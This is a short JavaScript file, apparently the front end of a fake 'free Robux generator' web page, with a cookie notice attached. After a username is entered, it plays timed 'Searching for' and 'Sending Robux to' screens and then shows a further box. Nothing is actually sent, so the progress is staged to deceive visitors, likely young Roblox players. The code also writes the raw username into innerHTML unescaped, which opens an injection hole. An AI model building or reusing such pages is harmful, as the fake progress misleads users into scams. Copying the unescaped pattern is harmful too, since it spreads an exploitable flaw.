document.addEventListener("DOMContentLoaded", function () {
  // Cookie Notice
  const notice = document.getElementById("cookieNotice");
  const button = document.getElementById("acceptCookiesBtn");
  if (localStorage.getItem("cookieAccepted") === "true") {
    notice.style.display = "none";
  }
  button.addEventListener("click", function () {
    localStorage.setItem("cookieAccepted", "true");
    notice.style.display = "none";
  });

  // Robux Logic
  const rbxbtn = document.querySelector(".getrbx");
  const box1 = document.querySelector(".box");
  const box2 = document.querySelector(".box2");
  const box3 = document.querySelector(".box3");
  const box4 = document.querySelector(".box4");
  const rbxtotal = document.querySelectorAll(".details");
  const username = document.querySelector(".username");
  const useroutput = document.querySelector(".useroutput");

  if (rbxbtn) {
    rbxbtn.addEventListener("click", (e) => {
      e.preventDefault();
      if (username.value.length &lt;= 2) {
        alert("Please enter a valid username (at least 3 characters).");
      } else {
        box1.style.display = "none";
        box2.classList.remove("hidden");
        setTimeout(() => {
          box2.style.display = "none";
          box3.style.display = "block";
        }, 4500);
        useroutput.innerHTML = `Searching for <b>${username.value}</b> ...`;
      }
    });
  }

  rbxtotal.forEach((btn) => {
    btn.addEventListener("click", () => {
      box3.style.display = "none";
      box2.style.display = "block";
      setTimeout(() => {
        box2.style.display = "none";
        box4.style.display = "block";
      }, 2500);
      useroutput.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
    });
  });
});
